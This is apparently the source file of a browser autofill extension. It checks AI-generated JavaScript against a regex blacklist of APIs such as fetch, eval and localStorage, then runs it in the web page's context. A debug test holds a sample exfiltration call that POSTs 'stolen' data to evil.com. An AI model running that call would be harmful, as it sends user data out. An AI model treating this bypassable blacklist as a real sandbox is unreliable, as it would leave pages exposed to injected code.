// 안전한 코드 실행 엔진

/**
 * AI가 생성한 코드를 안전하게 실행
 * @param {string} code - 실행할 JavaScript 코드
 * @returns {Promise<Object>} - { success: boolean, error?: string }
 */
async function executeSafeCode(code) {
  console.log('[Code Executor] 코드 실행 시작');
  console.log('[Code Executor] 코드 길이:', code.length, 'chars');
  console.log('[Code Executor] 전체 코드:\n' + code);

  try {
    // 1단계: 코드 검증
    validateCode(code);

    // 2단계: 안전한 컨텍스트에서 실행
    await runInSandbox(code);

    console.log('[Code Executor] 코드 실행 완료');
    return { success: true };

  } catch (error) {
    console.error('[Code Executor] 실행 오류:', error);
    return {
      success: false,
      error: error.message
    };
  }
}

/**
 * 코드 보안 검증
 * @param {string} code - 검증할 코드
 * @throws {Error} - 위험한 패턴 발견 시
 */
function validateCode(code) {
  console.log('[Code Executor] 보안 검증 시작');

  // 금지된 API 목록
  const blacklist = [
    { pattern: /\bfetch\s*\(/gi, reason: 'fetch API' },
    { pattern: /\bXMLHttpRequest\b/gi, reason: 'XMLHttpRequest' },
    { pattern: /\bchrome\./gi, reason: 'chrome API' },
    { pattern: /\blocalStorage\b/gi, reason: 'localStorage' },
    { pattern: /\bsessionStorage\b/gi, reason: 'sessionStorage' },
    { pattern: /\bwindow\.open\s*\(/gi, reason: 'window.open' },
    { pattern: /\blocation\s*=/gi, reason: 'location 변경' },
    { pattern: /\blocation\.href\s*=/gi, reason: 'location.href 변경' },
    { pattern: /\beval\s*\(/gi, reason: 'eval' },
    { pattern: /\bnew\s+Function\s*\(/gi, reason: 'Function 생성자' },
    { pattern: /\b__proto__\b/gi, reason: 'prototype 오염' },
    { pattern: /\bimport\s+/gi, reason: 'import 문' },
    { pattern: /\brequire\s*\(/gi, reason: 'require' },
  ];

  for (const { pattern, reason } of blacklist) {
    if (pattern.test(code)) {
      throw new Error(`보안: 금지된 패턴 발견 - ${reason}`);
    }
  }

  // 코드 길이 제한 (10KB)
  if (code.length > 10000) {
    throw new Error('보안: 코드가 너무 큽니다 (10KB 제한)');
  }

  console.log('[Code Executor] 보안 검증 통과');
}

/**
 * Main World에서 코드 실행
 *
 * AI가 생성한 코드를 Main World (웹페이지 컨텍스트)에서 실행합니다.
 * Main World에서는 CSP가 적용되지 않아 자유롭게 실행 가능합니다.
 *
 * @param {string} code - 실행할 코드
 * @returns {Promise<void>}
 */
async function runInSandbox(code) {
  console.log('[Code Executor] Main World로 코드 전송');
  console.log('[Code Executor] 전체 코드:\n', code);

  return new Promise((resolve, reject) => {
    // 실행 결과를 받기 위한 고유 ID
    const executionId = 'autofill_' + Date.now();

    // 실행 결과 리스너
    const messageListener = (event) => {
      if (event.data.type === 'AUTOFILL_EXECUTION_RESULT' &&
          event.data.executionId === executionId) {
        window.removeEventListener('message', messageListener);

        if (event.data.success) {
          if (event.data.warning) {
            console.warn('[Code Executor] Main World 실행 완료 (일부 오류):', event.data.warning);
          } else {
            console.log('[Code Executor] Main World 실행 성공');
          }
          resolve();
        } else {
          console.error('[Code Executor] Main World 실행 실패:', event.data.error);
          reject(new Error(event.data.error));
        }
      }
    };

    window.addEventListener('message', messageListener);

    // Main World에 코드 실행 요청 전송
    window.postMessage({
      type: 'AUTOFILL_EXECUTE_CODE',
      executionId: executionId,
      code: code
    }, '*');

    // 타임아웃 (10초)
    setTimeout(() => {
      window.removeEventListener('message', messageListener);
      reject(new Error('코드 실행 시간 초과 (10초)'));
    }, 10000);
  });
}

// 이하 패턴 매칭 함수들은 더 이상 사용하지 않음 (Main World에서 직접 실행)

/**
 * getElementById 패턴 실행 (DEPRECATED - Main World에서 직접 실행됨)
 */
async function executeGetElementById(line) {
  const match = line.match(/document\.getElementById\(['"]([^'"]+)['"]\)\.value\s*=\s*['"]([^'"]*)['"]/);
  if (!match) return;

  const [, elementId, value] = match;
  console.log(`[Code Executor] getElementById: #${elementId} = "${value}"`);

  const element = document.getElementById(elementId);
  if (!element) {
    console.warn(`[Code Executor] ⚠️ 요소를 찾을 수 없음: #${elementId}`);
    return;
  }

  console.log(`[Code Executor] ✓ 값 설정: #${elementId} = "${value}"`);
  element.value = value;
}

/**
 * forEach 블록 실행 (이벤트 발생)
 * 예: ['id1', 'id2'].forEach(function(id) { ... })
 */
async function executeForEach(allLines, startIndex) {
  const forEachLine = allLines[startIndex];

  // 배열에서 ID 목록 추출
  const arrayMatch = forEachLine.match(/\[([^\]]+)\]\.forEach/);
  if (!arrayMatch) return;

  const idsString = arrayMatch[1];
  const ids = idsString.split(',').map(id => id.trim().replace(/['"]/g, ''));

  console.log(`[Code Executor] forEach: ${ids.length}개 요소에 이벤트 발생`);

  // forEach 블록 내부에서 이벤트 타입 찾기
  let eventType = 'input'; // 기본값
  for (let i = startIndex + 1; i < allLines.length && i < startIndex + 5; i++) {
    const eventMatch = allLines[i].match(/new Event\(['"](\w+)['"]/);
    if (eventMatch) {
      eventType = eventMatch[1];
      break;
    }
  }

  // 각 ID에 대해 이벤트 발생
  ids.forEach(id => {
    const element = document.getElementById(id);
    if (element) {
      console.log(`[Code Executor] ✓ 이벤트 발생: #${id} -> ${eventType}`);
      element.dispatchEvent(new Event(eventType, { bubbles: true }));
    } else {
      console.warn(`[Code Executor] ⚠️ 요소를 찾을 수 없음: #${id}`);
    }
  });
}

/**
 * querySelector 블록 실행
 */
async function executeQuerySelector(startLine, allLines, startIndex) {
  // const XXX = document.querySelector('...');
  const match = startLine.match(/const\s+(\w+)\s*=\s*document\.querySelector\(['"]([^'"]+)['"]\)/);
  if (!match) return;

  const [, varName, selector] = match;
  console.log(`[Code Executor] querySelector: ${selector}`);

  const element = document.querySelector(selector);
  if (!element) {
    console.warn(`[Code Executor] ⚠️ 요소를 찾을 수 없음: ${selector}`);
    return;
  }

  console.log(`[Code Executor] ✓ 요소 찾음: ${selector}`);

  // 다음 줄부터 if (XXX) { 또는 바로 사용하는 경우 찾기
  let i = startIndex + 1;
  let insideIfBlock = false;

  while (i < allLines.length) {
    const line = allLines[i];

    // if (XXX) { 또는 if (XXX && YYY) { 또는 if 블록 시작
    if (line.includes(`if (${varName}`) ||
        line.includes(`if (${varName} &&`) ||
        line.startsWith('if (')) {
      insideIfBlock = true;
      i++;
      continue;
    }

    // element.value = 'xxx';
    if (line.includes(`${varName}.value`)) {
      const valueMatch = line.match(/\.value\s*=\s*['"]([^'"]*)['"]/);
      if (valueMatch) {
        const value = valueMatch[1];
        console.log(`[Code Executor] ✓ 값 설정: ${selector} = "${value}"`);
        element.value = value;
      }
    }

    // element.checked = true;
    if (line.includes(`${varName}.checked`)) {
      console.log(`[Code Executor] ✓ 체크: ${selector}`);
      element.checked = true;
    }

    // element.dispatchEvent
    if (line.includes(`${varName}.dispatchEvent`)) {
      const eventMatch = line.match(/new Event\(['"](\w+)['"]/);
      if (eventMatch) {
        const eventName = eventMatch[1];
        console.log(`[Code Executor] ✓ 이벤트 발생: ${selector} -> ${eventName}`);
        element.dispatchEvent(new Event(eventName, { bubbles: true }));
      }
    }

    // element.click();
    if (line.includes(`${varName}.click()`)) {
      console.log(`[Code Executor] ✓ 클릭: ${selector}`);
      element.click();
    }

    // } 블록 끝
    if (line === '}') {
      if (insideIfBlock) {
        break;
      }
    }

    i++;

    // 안전장치: 너무 멀리 가지 않도록
    if (i > startIndex + 20) break;
  }
}

/**
 * querySelectorAll 블록 실행 (forEach 등)
 */
async function executeQuerySelectorAll(startLine, allLines, startIndex) {
  // const XXX = document.querySelectorAll('...');
  const match = startLine.match(/const\s+(\w+)\s*=\s*document\.querySelectorAll\(['"]([^'"]+)['"]\)/);
  if (!match) return;

  const [, varName, selector] = match;
  console.log(`[Code Executor] querySelectorAll: ${selector}`);

  const elements = document.querySelectorAll(selector);
  if (elements.length === 0) {
    console.warn(`[Code Executor] 요소를 찾을 수 없음: ${selector}`);
    return;
  }

  console.log(`[Code Executor] ${elements.length}개 요소 찾음`);

  // XXX.forEach(field => { ... }) 블록 찾기
  let i = startIndex + 1;
  while (i < allLines.length) {
    const line = allLines[i];

    // forEach 시작
    if (line.includes(`${varName}.forEach`)) {
      // forEach 블록 내부 처리
      let j = i + 1;
      while (j < allLines.length) {
        const innerLine = allLines[j];

        // field.value = 'xxx';
        if (innerLine.includes('.value =')) {
          const valueMatch = innerLine.match(/\.value\s*=\s*['"]([^'"]*)['"]/);
          if (valueMatch) {
            const value = valueMatch[1];
            console.log(`[Code Executor] forEach: 모든 요소에 값 설정 = "${value}"`);
            elements.forEach(el => {
              el.value = value;
            });
          }
        }

        // field.dispatchEvent
        if (innerLine.includes('.dispatchEvent')) {
          const eventMatch = innerLine.match(/new Event\(['"](\w+)['"]/);
          if (eventMatch) {
            const eventName = eventMatch[1];
            console.log(`[Code Executor] forEach: 모든 요소에 이벤트 발생 -> ${eventName}`);
            elements.forEach(el => {
              el.dispatchEvent(new Event(eventName, { bubbles: true }));
            });
          }
        }

        // });  forEach 끝
        if (innerLine.includes('});')) {
          break;
        }

        j++;
      }
      break;
    }

    // } 블록 끝
    if (line === '}') {
      break;
    }

    i++;
  }
}

/**
 * Array.from 블록 실행 (버튼 찾기 등)
 */
async function executeArrayFrom(startLine, allLines, startIndex) {
  console.log('[Code Executor] Array.from 패턴 감지:', startLine);

  // const XXX = Array.from(document.querySelectorAll('YYY')).find(b => b.textContent.includes('ZZZ'));
  const match = startLine.match(/const\s+\w+\s*=\s*Array\.from\(document\.querySelectorAll\(['"](.*?)['"]\)\)\.find\(.+?\.textContent\.includes\(['"](.*?)['"]\)/);

  if (!match) {
    console.warn('[Code Executor] Array.from 패턴 매칭 실패');
    return;
  }

  const [, selector, searchText] = match;
  console.log(`[Code Executor] 버튼 찾기: "${selector}" contains "${searchText}"`);

  try {
    const elements = Array.from(document.querySelectorAll(selector));
    const button = elements.find(el => el.textContent && el.textContent.includes(searchText));

    if (!button) {
      console.warn(`[Code Executor] 버튼을 찾을 수 없음: "${searchText}"`);
      return;
    }

    // 다음 줄에서 .click() 찾기
    let i = startIndex + 1;
    while (i < allLines.length && i < startIndex + 5) {
      if (allLines[i].includes('.click()')) {
        console.log(`[Code Executor] ✓ 버튼 클릭: "${searchText}"`);
        button.click();

        // 클릭 후 약간 대기
        await new Promise(r => setTimeout(r, 100));
        break;
      }
      i++;
    }
  } catch (error) {
    console.error('[Code Executor] Array.from 실행 오류:', error);
  }
}

/**
 * 코드 실행 테스트 (디버깅용)
 */
async function testCodeExecutor() {
  console.log('=== Code Executor 테스트 시작 ===');

  // 테스트 1: 안전한 코드
  const safeCode = `
    const input = document.querySelector('input[name="test"]');
    if (input) {
      input.value = '테스트';
      console.log('입력 완료');
    }
  `;

  const result1 = await executeSafeCode(safeCode);
  console.log('테스트 1 (안전한 코드):', result1);

  // 테스트 2: 위험한 코드 (fetch)
  const dangerousCode = `
    fetch('https://evil.com/steal', {
      method: 'POST',
      body: JSON.stringify({ data: 'stolen' })
    });
  `;

  const result2 = await executeSafeCode(dangerousCode);
  console.log('테스트 2 (위험한 코드):', result2);

  // 테스트 3: 비동기 코드
  const asyncCode = `
    console.log('시작');
    await new Promise(r => setTimeout(r, 1000));
    console.log('1초 후');
  `;

  const result3 = await executeSafeCode(asyncCode);
  console.log('테스트 3 (비동기 코드):', result3);

  console.log('=== Code Executor 테스트 완료 ===');
}
